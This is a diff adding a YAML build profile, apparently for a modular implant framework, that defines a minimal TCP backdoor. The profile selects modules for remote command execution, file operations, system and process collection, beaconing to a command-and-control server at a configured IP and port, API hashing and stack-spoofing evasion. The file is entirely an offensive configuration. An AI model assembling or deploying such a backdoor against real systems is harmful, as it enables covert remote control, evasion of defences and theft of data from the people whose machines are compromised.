@@ -1,0 +1,22 @@
+name: backdoor_cs_tcp_minimal_v1
+description: Minimal TCP backdoor for testing
+core:
+  - core/emit_buffer
+  - core/run_cmd
+  - core/file_ops
+collectors:
+  - collectors/system_info
+  - collectors/processes
+exfil: c2/tcp_beacon
+arch: arch/backdoor
+resources: true
+api_resolve: api_resolve/api_hash_djb2
+evasion:
+  - evasion/stack_spoof
+commands:
+  - commands/cmd_sysinfo
+  - commands/cmd_processes
+  - commands/cmd_exec
+vars:
+  C2_IP: "10.0.2.2"
+  C2_PORT: "9001"
